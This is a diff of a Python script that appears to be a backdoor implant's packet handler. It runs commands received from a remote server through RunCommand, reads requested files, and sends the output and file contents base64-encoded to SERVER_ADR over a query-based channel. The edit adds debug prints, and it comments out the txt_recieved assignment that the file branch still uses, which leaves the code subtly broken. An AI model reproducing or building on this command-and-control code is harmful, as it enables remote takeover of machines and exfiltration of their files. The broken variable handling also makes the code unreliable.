@@ -44,15 +44,17 @@ def parse_packet(packet):
         
         if prefix_packet == RUN or prefix_packet == FILE:
             print("recieved response!")
-            txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
+            #txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
             if prefix_packet == RUN:
-                output = RunCommand(txt_recieved)
+                print("command is: "+data_recieved)
+                output = RunCommand(data_recieved)
                 bin_output = bytes(output.encode())
                 send_qery(SERVER_ADR,base64.b64encode(BEGIN_OUTPUT)+data_recieved,0)
                 send_qery(SERVER_ADR,base64.b64encode(bin_output),1)
                 # pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
                 # pkt_send(pkt_no_data,bin_output,1)
             else:
+                print("file is: "+data_recieved)
                 output = read_file(txt_recieved)   # read in binary mode
                 send_qery(SERVER_ADR,base64.b64encode(BEGIN_FILE)+data_recieved,0)
                 send_qery(SERVER_ADR,base64.b64encode(output),1)
